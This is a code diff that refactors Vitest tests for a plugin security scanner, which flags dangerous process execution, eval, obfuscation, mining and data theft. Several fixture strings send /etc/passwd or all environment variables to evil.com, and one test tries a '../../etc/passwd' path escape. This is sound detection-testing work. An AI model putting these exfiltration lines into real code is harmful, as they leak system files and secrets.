@@ -2,7 +2,7 @@ import fsSync from "node:fs";
 import fs from "node:fs/promises";
 import os from "node:os";
 import path from "node:path";
-import { afterAll, describe, expect, it, vi } from "vitest";
+import { afterAll, afterEach, describe, expect, it, vi } from "vitest";
 import { isScannable, scanDirectoryWithSummary, scanSkillContent, scanSource } from "./scanner.js";
 import type { SkillScanOptions } from "./scanner.js";
 
@@ -10,28 +10,27 @@ const fixtureRoot = fsSync.mkdtempSync(path.join(os.tmpdir(), "skill-scanner-tes
 let fixtureId = 0;
 
 afterAll(() => fsSync.rmSync(fixtureRoot, { recursive: true, force: true }));
+afterEach(() => vi.restoreAllMocks());
 
-function makeTmpDir(): string {
+function makeTmpDir(files: Record<string, string> = {}): string {
   const dir = path.join(fixtureRoot, `case-${fixtureId++}`);
   fsSync.mkdirSync(dir, { recursive: true });
+  writeFixtureFiles(dir, files);
   return dir;
 }
 
 function expectScanRule(
   source: string,
   expected: { ruleId: string; severity?: "warn" | "critical"; messageIncludes?: string },
-  name: string,
 ) {
-  const findings = scanSource(source, "plugin.ts");
-  expect(
-    findings.filter(
-      (finding) =>
-        finding.ruleId === expected.ruleId &&
-        (expected.severity == null || finding.severity === expected.severity) &&
-        (expected.messageIncludes == null || finding.message.includes(expected.messageIncludes)),
-    ),
-    name,
-  ).not.toEqual([]);
+  const { messageIncludes, ...fields } = expected;
+  const match =
+    messageIncludes == null
+      ? fields
+      : { ...fields, message: expect.stringContaining(messageIncludes) };
+  expect(scanSource(source, "plugin.ts"), source).toEqual(
+    expect.arrayContaining([expect.objectContaining(match)]),
+  );
 }
 
 function writeFixtureFiles(root: string, files: Record<string, string>) {
@@ -42,36 +41,52 @@ function writeFixtureFiles(root: string, files: Record<string, string>) {
   }
 }
 
+function makeFile(name: string, source = "export const ok = true;") {
+  const root = makeTmpDir({ [name]: source });
+  return { root, filePath: path.join(root, name) };
+}
+
+function rewriteAfterStat(filePath: string, source: string) {
+  const realStat = fs.stat;
+  let changed = false;
+  vi.spyOn(fs, "stat").mockImplementation(async (...args) => {
+    const result = await realStat(...args);
+    if (args[0] === filePath && !changed) {
+      changed = true;
+      fsSync.writeFileSync(filePath, source);
+    }
+    return result;
+  });
+  return () => changed;
+}
+
 function expectRulePresence(findings: { ruleId: string }[], ruleId: string, expected: boolean) {
   expect(findings.some((finding) => finding.ruleId === ruleId)).toBe(expected);
 }
 
 describe("scanSource", () => {
-  it.each(["execFile as spawn"])(
-    "bounds dense line-rule findings and reports truncation for %s",
-    (binding) => {
-      const source = [
-        `import { ${binding} } from "node:child_process";`,
-        ...Array.from({ length: 40 }, (_, index) => `spawn("node", ["${index}.js"]);`),
-      ].join("\n");
+  it("bounds dense line-rule findings and reports truncation for execFile as spawn", () => {
+    const source = [
+      'import { execFile as spawn } from "node:child_process";',
+      ...Array.from({ length: 40 }, (_, index) => `spawn("node", ["${index}.js"]);`),
+    ].join("\n");
 
-      const findings = scanSource(source, "plugin.ts").filter((candidate) =>
-        candidate.ruleId.startsWith("dangerous-exec"),
-      );
+    const findings = scanSource(source, "plugin.ts").filter((candidate) =>
+      candidate.ruleId.startsWith("dangerous-exec"),
+    );
 
-      expect(findings).toHaveLength(33);
-      expect(findings.slice(0, -1).every((finding) => finding.ruleId === "dangerous-exec")).toBe(
-        true,
-      );
-      expect(findings.at(-1)).toMatchObject({
-        ruleId: "dangerous-exec-truncated",
-        severity: "critical",
-        line: 41,
-        message: "8 additional dangerous-exec matches omitted after 32 findings",
-        evidence: "[8 additional matches omitted after 32 findings]",
-      });
-    },
-  );
+    expect(findings).toHaveLength(33);
+    expect(findings.slice(0, -1).every((finding) => finding.ruleId === "dangerous-exec")).toBe(
+      true,
+    );
+    expect(findings.at(-1)).toMatchObject({
+      ruleId: "dangerous-exec-truncated",
+      severity: "critical",
+      line: 41,
+      message: "8 additional dangerous-exec matches omitted after 32 findings",
+      evidence: "[8 additional matches omitted after 32 findings]",
+    });
+  });
 
   it("keeps bounded evidence free of lone surrogates", () => {
     const source = `${"a".repeat(119)}😀 child_process.exec("echo unsafe")`;
@@ -84,118 +99,56 @@ describe("scanSource", () => {
     expect(finding?.evidence).not.toMatch(loneSurrogate);
   });
 
-  const scanRuleCases = [
-    {
-      name: "detects child_process exec with string interpolation",
-      source: '\nimport { exec } from "child_process";\nconst cmd = `ls ${dir}`;\nexec(cmd);\n',
-      expected: { ruleId: "dangerous-exec", severity: "critical" as const },
-    },
-    {
-      name: "detects child_process spawn usage",
-      source: '\nconst cp = require("child_process");\ncp.spawn("node", ["server.js"]);\n',
-      expected: { ruleId: "dangerous-exec", severity: "critical" as const },
-    },
-    {
-      name: "detects child_process namespaced exec usage",
-      source: '\nconst cp = require("child_process");\ncp.exec("node server.js");\n',
-      expected: { ruleId: "dangerous-exec", severity: "critical" as const },
-    },
-    {
-      name: "detects eval usage",
-      source: '\nconst code = "1+1";\nconst result = eval(code);\n',
-      expected: { ruleId: "dynamic-code-execution", severity: "critical" as const },
-    },
-    {
-      name: "detects new Function constructor",
-      source: '\nconst fn = new Function("a", "b", "return a + b");\n',
-      expected: { ruleId: "dynamic-code-execution", severity: "critical" as const },
-    },
-    {
-      name: "detects fs.readFile combined with fetch POST (exfiltration)",
-      source:
-        '\nimport fs from "node:fs";\nconst data = fs.readFileSync("/etc/passwd", "utf-8");\nfetch("https://evil.com/collect", { method: "post", body: data });\n',
-      expected: { ruleId: "potential-exfiltration", severity: "warn" as const },
-    },
-    {
-      name: "detects hex-encoded strings (obfuscation)",
-      source: '\nconst payload = "\\x72\\x65\\x71\\x75\\x69\\x72\\x65";\n',
-      expected: { ruleId: "obfuscated-code", severity: "warn" as const },
-    },
-    {
-      name: "detects base64 decode of large payloads (obfuscation)",
-      source: `\nconst data = atob("${"A".repeat(250)}");\n`,
-      expected: { ruleId: "obfuscated-code", messageIncludes: "base64" },
-    },
-    {
-      name: "detects stratum protocol references (mining)",
-      source: '\nconst pool = "stratum+tcp://pool.example.com:3333";\n',
-      expected: { ruleId: "crypto-mining", severity: "critical" as const },
-    },
-    {
-      name: "detects WebSocket to non-standard high port",
-      source: '\nconst ws = new WebSocket("ws://remote.host:9999");\n',
-      expected: { ruleId: "suspicious-network", severity: "warn" as const },
-    },
-    {
-      name: "detects process.env access combined with network send (env harvesting)",
-      source:
-        '\nconst secrets = JSON.stringify(process.env);\nfetch("https://evil.com/harvest", { method: "POST", body: secrets });\n',
-      expected: { ruleId: "env-harvesting", severity: "critical" as const },
-    },
-    {
-      name: "detects child_process call through an ESM import alias",
-      source:
-        '\nimport { spawn as launch } from "node:child_process";\nlaunch("node", ["server.js"]);\n',
-      expected: { ruleId: "dangerous-exec", severity: "critical" as const },
-    },
-    {
-      name: "detects child_process call through a CJS destructured alias",
-      source: '\nconst { exec: run } = require("child_process");\nrun("node server.js");\n',
-      expected: { ruleId: "dangerous-exec", severity: "critical" as const },
-    },
-    {
-      name: "detects child_process call through a computed member",
-      source: '\nimport cp from "node:child_process";\ncp["spawn"]("node", ["server.js"]);\n',
-      expected: { ruleId: "dangerous-exec", severity: "critical" as const },
-    },
-    {
-      name: "detects child_process computed exec through a namespace alias",
-      source: '\nconst proc = require("child_process");\nproc["exec"]("node server.js");\n',
-      expected: { ruleId: "dangerous-exec", severity: "critical" as const },
-    },
-    {
-      name: "detects child_process computed execSync through a namespace alias",
-      source: '\nimport cp from "node:child_process";\ncp["execSync"]("node server.js");\n',
-      expected: { ruleId: "dangerous-exec", severity: "critical" as const },
-    },
-    {
-      name: "detects child_process direct exec through a CJS namespace alias",
-      source: '\nconst proc = require("child_process");\nproc.exec("node server.js");\n',
-      expected: { ruleId: "dangerous-exec", severity: "critical" as const },
-    },
-    {
-      name: "detects child_process direct exec through an ESM namespace import",
-      source: '\nimport * as proc from "node:child_process";\nproc.exec("node server.js");\n',
-      expected: { ruleId: "dangerous-exec", severity: "critical" as const },
-    },
-    {
-      name: "detects child_process computed spawn through an ESM namespace import",
-      source:
-        '\nimport * as proc from "node:child_process";\nproc["spawn"]("node", ["server.js"]);\n',
-      expected: { ruleId: "dangerous-exec", severity: "critical" as const },
-    },
-    {
-      name: "reports a literal and an aliased child_process call on the same line",
-      source:
-        '\nconst { exec: run } = require("child_process");\nexec("node a.js"); run("node b.js");\n',
-      expected: { ruleId: "dangerous-exec", severity: "critical" as const },
-    },
-  ] as const;
-
   it("detects suspicious source patterns", () => {
-    for (const testCase of scanRuleCases) {
-      expectScanRule(testCase.source, testCase.expected, testCase.name);
+    function check(expected: Parameters<typeof expectScanRule>[1], ...sources: string[]) {
+      for (const source of sources) {
+        expectScanRule(source, expected);
+      }
     }
+    check(
+      { ruleId: "dangerous-exec", severity: "critical" },
+      '\nimport { exec } from "child_process";\nconst cmd = `ls ${dir}`;\nexec(cmd);\n',
+      '\nconst cp = require("child_process");\ncp.spawn("node", ["server.js"]);\n',
+      '\nconst cp = require("child_process");\ncp.exec("node server.js");\n',
+      '\nimport { spawn as launch } from "node:child_process";\nlaunch("node", ["server.js"]);\n',
+      '\nconst { exec: run } = require("child_process");\nrun("node server.js");\n',
+      '\nimport cp from "node:child_process";\ncp["spawn"]("node", ["server.js"]);\n',
+      '\nconst proc = require("child_process");\nproc["exec"]("node server.js");\n',
+      '\nimport cp from "node:child_process";\ncp["execSync"]("node server.js");\n',
+      '\nconst proc = require("child_process");\nproc.exec("node server.js");\n',
+      '\nimport * as proc from "node:child_process";\nproc.exec("node server.js");\n',
+      '\nimport * as proc from "node:child_process";\nproc["spawn"]("node", ["server.js"]);\n',
+      '\nconst { exec: run } = require("child_process");\nexec("node a.js"); run("node b.js");\n',
+    );
+    check(
+      { ruleId: "dynamic-code-execution", severity: "critical" },
+      '\nconst code = "1+1";\nconst result = eval(code);\n',
+      '\nconst fn = new Function("a", "b", "return a + b");\n',
+    );
+    check(
+      { ruleId: "potential-exfiltration", severity: "warn" },
+      '\nimport fs from "node:fs";\nconst data = fs.readFileSync("/etc/passwd", "utf-8");\nfetch("https://evil.com/collect", { method: "post", body: data });\n',
+    );
+    check(
+      { ruleId: "obfuscated-code", severity: "warn" },
+      '\nconst payload = "\\x72\\x65\\x71\\x75\\x69\\x72\\x65";\n',
+    );
+    check(
+      { ruleId: "obfuscated-code", messageIncludes: "base64" },
+      `\nconst data = atob("${"A".repeat(250)}");\n`,
+    );
+    check(
+      { ruleId: "crypto-mining", severity: "critical" },
+      '\nconst pool = "stratum+tcp://pool.example.com:3333";\n',
+    );
+    check(
+      { ruleId: "suspicious-network", severity: "warn" },
+      '\nconst ws = new WebSocket("ws://remote.host:9999");\n',
+    );
+    check(
+      { ruleId: "env-harvesting", severity: "critical" },
+      '\nconst secrets = JSON.stringify(process.env);\nfetch("https://evil.com/harvest", { method: "POST", body: secrets });\n',
+    );
   });
 
   it("reports every aliased child_process call on a line", () => {
@@ -223,17 +176,10 @@ describe("scanSource", () => {
   });
 
   it("does not flag ordinary env defaults when network sends are elsewhere in a bundled file", () => {
-    const source = `
-function resolvePreferencesStorePath(env = process.env) {
-  return path.join(resolveStateDir(env), "discord", "model-picker-preferences.json");
-}
-
-${"\n".repeat(20)}
-
-export async function sendMessage(rest, channelId, data) {
-  return await rest.post(\`/channels/\${channelId}/messages\`, data);
-}
-`;
+    const source =
+      '\nfunction resolvePreferencesStorePath(env = process.env) {\n  return path.join(resolveStateDir(env), "discord", "model-picker-preferences.json");\n}\n\n' +
+      "\n".repeat(20) +
+      "\n\nexport async function sendMessage(rest, channelId, data) {\n  return await rest.post(`/channels/${channelId}/messages`, data);\n}\n";
     const findings = scanSource(source, "provider-bundle.js");
     expectRulePresence(findings, "env-harvesting", false);
   });
@@ -285,135 +231,96 @@ describe("scanSkillContent", () => {
   });
 });
 
-describe("isScannable", () => {
-  it("classifies scannable extensions", () => {
-    for (const [fileName, expected] of [
-      ["file.js", true],
-      ["file.ts", true],
-      ["file.mjs", true],
-      ["file.cjs", true],
-      ["file.tsx", true],
-      ["file.jsx", true],
-      ["readme.md", false],
-      ["package.json", false],
-      ["logo.png", false],
-      ["style.css", false],
-    ] as const) {
+it("isScannable classifies scannable extensions", () => {
+  for (const [expected, fileNames] of [
+    [true, ["file.js", "file.ts", "file.mjs", "file.cjs", "file.tsx", "file.jsx"]],
+    [false, ["readme.md", "package.json", "logo.png", "style.css"]],
+  ] as const) {
+    for (const fileName of fileNames) {
       expect(isScannable(fileName), fileName).toBe(expected);
     }
-  });
+  }
 });
 
 describe("scanDirectoryWithSummary", () => {
-  const summaryCases: {
-    name: string;
-    files: Record<string, string>;
-    options?: SkillScanOptions;
-    expected: Partial<Awaited<ReturnType<typeof scanDirectoryWithSummary>>>;
-    findingCount?: number;
-    maxFindings?: number;
-  }[] = [
-    {
-      name: "returns correct counts",
-      files: {
-        "a.js": `const x = eval("code");`,
-        "src/b.ts": `const pool = "stratum+tcp://pool:3333";`,
-        "src/c.ts": `export const clean = true;`,
-      },
-      expected: { scannedFiles: 3, critical: 2, warn: 0, info: 0 },
-      findingCount: 2,
-    },
-    {
-      name: "caps scanned file count with maxFiles",
-      files: {
-        "a.js": `const x = eval("a");`,
-        "b.js": `const x = eval("b");`,
-        "c.js": `const x = eval("c");`,
-      },
-      options: { maxFiles: 2 },
-      expected: { scannedFiles: 2, truncated: true },
-      maxFindings: 2,
-    },
-    {
-      name: "does not mark scans truncated when file count exactly matches maxFiles",
-      files: {
-        "a.js": `const x = eval("a");`,
-        "b.js": `const x = eval("b");`,
-      },
-      options: { maxFiles: 2 },
-      expected: { scannedFiles: 2, truncated: false },
-      findingCount: 2,
-    },
-    {
-      name: "skips files above maxFileBytes",
-      files: { "large.js": `eval("${"A".repeat(4096)}");` },
-      options: { maxFileBytes: 64 },
-      expected: { scannedFiles: 0, findings: [] },
-    },
-    {
-      name: "ignores missing included files",
-      files: { "clean.js": `export const ok = true;` },
-      options: { includeFiles: ["missing.js"] },
-      expected: { scannedFiles: 1, findings: [] },
-    },
-    {
-      name: "prioritizes included entry files when maxFiles is reached",
-      files: {
-        "regular.js": `export const ok = true;`,
-        ".hidden/entry.js": `const x = eval("hack");`,
-      },
-      options: { maxFiles: 1, includeFiles: [".hidden/entry.js"] },
-      expected: {
+  async function checkSummary(
+    files: Record<string, string>,
+    expected: Partial<Awaited<ReturnType<typeof scanDirectoryWithSummary>>>,
+    options?: SkillScanOptions,
+    findingCount?: number,
+  ) {
+    const summary = await scanDirectoryWithSummary(makeTmpDir(files), options);
+    expect(summary, JSON.stringify(files)).toMatchObject(expected);
+    if (findingCount != null) {
+      expect(summary.findings).toHaveLength(findingCount);
+    }
+    return summary;
+  }
+
+  it("summarizes directory scan results", async () => {
+    const clean = "export const ok = true;";
+    const unsafe = 'eval("code");';
+    await checkSummary(
+      { "a.js": unsafe, "src/b.ts": 'const pool = "stratum+tcp://pool:3333";', "src/c.ts": clean },
+      { scannedFiles: 3, critical: 2, warn: 0, info: 0 },
+      undefined,
+      2,
+    );
+    const capped = await checkSummary(
+      { "a.js": unsafe, "b.js": unsafe, "c.js": unsafe },
+      { scannedFiles: 2, truncated: true },
+      { maxFiles: 2 },
+    );
+    expect(capped.findings.length).toBeLessThanOrEqual(2);
+    await checkSummary(
+      { "a.js": unsafe, "b.js": unsafe },
+      { scannedFiles: 2, truncated: false },
+      { maxFiles: 2 },
+      2,
+    );
+    await checkSummary(
+      { "large.js": `eval("${"A".repeat(4096)}");` },
+      { scannedFiles: 0, findings: [] },
+      { maxFileBytes: 64 },
+    );
+    await checkSummary(
+      { "clean.js": clean },
+      { scannedFiles: 1, findings: [] },
+      { includeFiles: ["missing.js"] },
+    );
+    await checkSummary(
+      { "regular.js": clean, ".hidden/entry.js": unsafe },
+      {
         scannedFiles: 1,
         findings: expect.arrayContaining([
           expect.objectContaining({ ruleId: "dynamic-code-execution" }),
         ]),
       },
-    },
-    {
-      name: "keeps other source files when entry files are explicitly included",
-      files: {
-        "entry.js": `export const ok = true;`,
-        "scripts/harness.js": `const x = eval("hack");`,
+      { maxFiles: 1, includeFiles: [".hidden/entry.js"] },
+    );
+    await checkSummary(
+      { "entry.js": clean, "scripts/harness.js": unsafe },
+      { scannedFiles: 2 },
+      { includeFiles: ["entry.js"] },
+      1,
+    );
+    await checkSummary(
+      {
+        "runtime.ts": clean,
+        "worker.test-helper.ts": 'import { spawn } from "node:child_process"; spawn("node");',
       },
-      options: { includeFiles: ["entry.js"] },
-      expected: { scannedFiles: 2 },
-      findingCount: 1,
-    },
-    {
-      name: "scans test helpers alongside runtime source",
-      files: {
-        "runtime.ts": `export const ok = true;`,
-        "worker.test-helper.ts": `import { spawn } from "node:child_process"; spawn("node");`,
-      },
-      expected: { scannedFiles: 2 },
-      findingCount: 1,
-    },
-  ];
-
-  it("summarizes directory scan results", async () => {
-    for (const testCase of summaryCases) {
-      const root = makeTmpDir();
-      writeFixtureFiles(root, testCase.files);
-      const summary = await scanDirectoryWithSummary(root, testCase.options);
-      expect(summary, testCase.name).toMatchObject(testCase.expected);
-      if (testCase.findingCount != null) {
-        expect(summary.findings, testCase.name).toHaveLength(testCase.findingCount);
-      }
-      if (testCase.maxFindings != null) {
-        expect(summary.findings.length, testCase.name).toBeLessThanOrEqual(testCase.maxFindings);
-      }
-    }
+      { scannedFiles: 2 },
+      undefined,
+      1,
+    );
   });
 
   it("throws when reading a scannable file fails", async () => {
-    const root = makeTmpDir();
-    const filePath = path.join(root, "bad.js");
-    fsSync.writeFileSync(filePath, "export const ok = true;\n");
+    const { root, filePath } = makeFile("bad.js", "export const ok = true;\n");
 
     const realOpen = fs.open;
     const canonicalPath = fsSync.realpathSync(filePath);
-    const spy = vi.spyOn(fs, "open").mockImplementation(async (...args) => {
+    vi.spyOn(fs, "open").mockImplementation(async (...args) => {
       const pathArg = args[0];
       if (typeof pathArg === "string" && pathArg === canonicalPath) {
         throw Object.assign(new Error("EACCES: permission denied"), { code: "EACCES" });
@@ -421,16 +328,11 @@ describe("scanDirectoryWithSummary", () => {
       return await realOpen(...args);
     });
 
-    try {
-      await expect(scanDirectoryWithSummary(root)).rejects.toMatchObject({ code: "EACCES" });
-    } finally {
-      spy.mockRestore();
-    }
+    await expect(scanDirectoryWithSummary(root)).rejects.toMatchObject({ code: "EACCES" });
   });
 
   it("invalidates file scan cache when maxFileBytes changes between scans", async () => {
-    const root = makeTmpDir();
-    writeFixtureFiles(root, { "a.js": `eval("${"A".repeat(100)}");` });
+    const root = makeTmpDir({ "a.js": `eval("${"A".repeat(100)}");` });
     const first = await scanDirectoryWithSummary(root, { maxFileBytes: 1024 });
     const summary = await scanDirectoryWithSummary(root, { maxFileBytes: 64 });
     expect(first.critical).toBe(1);
@@ -438,35 +340,18 @@ describe("scanDirectoryWithSummary", () => {
   });
 
   it("skips a file that grows beyond maxFileBytes after the initial stat", async () => {
-    const root = makeTmpDir();
-    const filePath = path.join(root, "growing.js");
-    fsSync.writeFileSync(filePath, `export const ok = true;`);
-    const realStat = fs.stat;
-    let grew = false;
-    const spy = vi.spyOn(fs, "stat").mockImplementation(async (...args) => {
-      const result = await realStat(...args);
-      if (args[0] === filePath && !grew) {
-        grew = true;
-        fsSync.writeFileSync(filePath, `eval("${"A".repeat(128)}");`);
-      }
-      return result;
-    });
-    try {
-      const summary = await scanDirectoryWithSummary(root, { maxFileBytes: 64 });
-      expect(grew).toBe(true);
-      expect(summary).toMatchObject({ scannedFiles: 0, findings: [] });
-    } finally {
-      spy.mockRestore();
-    }
+    const { root, filePath } = makeFile("growing.js");
+    const grew = rewriteAfterStat(filePath, `eval("${"A".repeat(128)}");`);
+    const summary = await scanDirectoryWithSummary(root, { maxFileBytes: 64 });
+    expect(grew()).toBe(true);
+    expect(summary).toMatchObject({ scannedFiles: 0, findings: [] });
   });
 
   it("invalidates cached findings when a file is replaced with the same size and mtime", async () => {
-    const root = makeTmpDir();
-    const filePath = path.join(root, "replaced.js");
     const source = `export const ok = true;`;
+    const { root, filePath } = makeFile("replaced.js", source);
     const changedSource = `eval("changed");`.padEnd(source.length);
     const timestamp = new Date(1_700_000_000_000);
-    fsSync.writeFileSync(filePath, source);
     await fs.utimes(filePath, timestamp, timestamp);
     expect((await scanDirectoryWithSummary(root)).critical).toBe(0);
 
@@ -479,37 +364,19 @@ describe("scanDirectoryWithSummary", () => {
   });
 
   it("reuses findings under the metadata of the file actually read", async () => {
-    const root = makeTmpDir();
-    const filePath = path.join(root, "changed-before-read.js");
-    fsSync.writeFileSync(filePath, `export const ok = true;`);
-    const realStat = fs.stat;
-    let changed = false;
-    const statSpy = vi.spyOn(fs, "stat").mockImplementation(async (...args) => {
-      const result = await realStat(...args);
-      if (args[0] === filePath && !changed) {
-        changed = true;
-        fsSync.writeFileSync(filePath, `eval("changed before reading");`);
-      }
-      return result;
-    });
+    const { root, filePath } = makeFile("changed-before-read.js");
+    const changed = rewriteAfterStat(filePath, `eval("changed before reading");`);
     const openSpy = vi.spyOn(fs, "open");
     const readSpy = vi.spyOn(fs, "readFile");
-    try {
-      expect((await scanDirectoryWithSummary(root)).critical).toBe(1);
-      expect((await scanDirectoryWithSummary(root)).critical).toBe(1);
-      expect(changed).toBe(true);
-      expect(openSpy.mock.calls.length + readSpy.mock.calls.length).toBe(1);
-    } finally {
-      statSpy.mockRestore();
-      openSpy.mockRestore();
-      readSpy.mockRestore();
-    }
+    expect((await scanDirectoryWithSummary(root)).critical).toBe(1);
+    expect((await scanDirectoryWithSummary(root)).critical).toBe(1);
+    expect(changed()).toBe(true);
+    expect(openSpy.mock.calls.length + readSpy.mock.calls.length).toBe(1);
   });
 
   it("preserves explicitly included symlink and hardlink sources", async () => {
     const root = makeTmpDir();
-    const outside = path.join(makeTmpDir(), "source.js");
-    fsSync.writeFileSync(outside, `eval("included");`);
+    const { filePath: outside } = makeFile("source.js", `eval("included");`);
     const hardlinkPath = path.join(root, "hardlink.js");
     await fs.link(outside, hardlinkPath);
     const includeFiles = ["hardlink.js"];
@@ -525,37 +392,27 @@ describe("scanDirectoryWithSummary", () => {
   });
 
   it("skips includeFiles entries that escape the root directory", async () => {
-    const root = makeTmpDir();
-    writeFixtureFiles(root, { "clean.js": `export const x = 1;` });
-    // "../../etc/passwd" resolves outside root — isPathInside returns false → continue
+    const root = makeTmpDir({ "clean.js": `export const x = 1;` });
     const summary = await scanDirectoryWithSummary(root, { includeFiles: ["../../etc/passwd"] });
     expect(summary.findings).toHaveLength(0);
   });
 
   it("re-throws when stat throws a non-ENOENT error during file scan", async () => {
-    const root = makeTmpDir();
-    const filePath = path.join(root, "noperm.js");
-    fsSync.writeFileSync(filePath, `export const x = 1;`);
+    const { root, filePath } = makeFile("noperm.js", `export const x = 1;`);
 
     const realStat = fs.stat;
-    const spy = vi.spyOn(fs, "stat").mockImplementation(async (...args) => {
+    vi.spyOn(fs, "stat").mockImplementation(async (...args) => {
       if (args[0] === filePath) {
         throw Object.assign(new Error("EACCES: permission denied"), { code: "EACCES" });
       }
       return await realStat(...args);
     });
 
-    try {
-      await expect(scanDirectoryWithSummary(root)).rejects.toMatchObject({ code: "EACCES" });
-    } finally {
-      spy.mockRestore();
-    }
+    await expect(scanDirectoryWithSummary(root)).rejects.toMatchObject({ code: "EACCES" });
   });
 
   it("reuses cached findings for unchanged files and invalidates on file updates", async () => {
-    const root = makeTmpDir();
-    const filePath = path.join(root, "cached.js");
-    fsSync.writeFileSync(filePath, `const x = eval("1+1");`);
+    const { root, filePath } = makeFile("cached.js", `const x = eval("1+1");`);
 
     const readSpy = vi.spyOn(fs, "open");
     const first = await scanDirectoryWithSummary(root);
@@ -570,12 +427,10 @@ describe("scanDirectoryWithSummary", () => {
 
     expect(third.critical).toBeGreaterThan(0);
     expect(readSpy).toHaveBeenCalledTimes(2);
-    readSpy.mockRestore();
   });
 
   it("discovers added files when directory timestamps are restored", async () => {
-    const root = makeTmpDir();
-    fsSync.writeFileSync(path.join(root, "cached.js"), `export const ok = true;`);
+    const { root } = makeFile("cached.js");
     const modifiedAt = new Date("2026-01-01T00:00:00Z");
     await fs.utimes(root, modifiedAt, modifiedAt);
 
@@ -593,18 +448,14 @@ describe("scanDirectoryWithSummary", () => {
     const fixture = path.join(root, "asset.png");
     await fs.writeFile(fixture, "image");
     const openDirectory = fs.opendir.bind(fs);
-    const opendir = vi.spyOn(fs, "opendir").mockImplementation(async (...args) => {
+    vi.spyOn(fs, "opendir").mockImplementation(async (...args) => {
       const directory = await openDirectory(...args);
       const entry = await directory.read();
       let remaining = 100_001;
       directory.read = async () => (remaining-- > 0 ? entry : null);
       return directory;
     });
-    try {
-      const summary = await scanDirectoryWithSummary(root);
-      expect(summary).toMatchObject({ scannedFiles: 0, truncated: true, findings: [] });
-    } finally {
-      opendir.mockRestore();
-    }
+    const summary = await scanDirectoryWithSummary(root);
+    expect(summary).toMatchObject({ scannedFiles: 0, truncated: true, findings: [] });
   });
 });
